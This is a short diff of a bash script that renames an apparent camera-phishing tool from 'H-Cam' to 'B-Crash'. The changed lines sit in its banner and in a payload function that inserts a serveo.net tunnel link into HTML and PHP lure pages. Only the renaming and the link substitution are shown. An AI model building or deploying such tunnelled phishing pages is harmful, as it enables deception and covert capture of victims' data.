@@ -4,7 +4,7 @@
 trap 'printf "\n";stop' 2
 
 banner() {
-command -v lolcat > /dev/null 2>&1 || { echo >&2 "H-Cam needed lolcat.Please install lolcat"; exit 1; }
+command -v lolcat > /dev/null 2>&1 || { echo >&2 "bcrash needed lolcat.Please install lolcat"; exit 1; }
  
 c="toilet -f term -F gay"
 figlet B-Crash | $c
@@ -208,7 +208,7 @@ payload() {
 
 send_link=$(grep -o "https://[0-9a-z]*\.serveo.net" sendlink)
 
-sed 's+forwarding_link+'$send_link'+g' H-Cam.html > index2.html
+sed 's+forwarding_link+'$send_link'+g' bc.html > index2.html
 sed 's+forwarding_link+'$send_link'+g' template.php > index.php
 
 
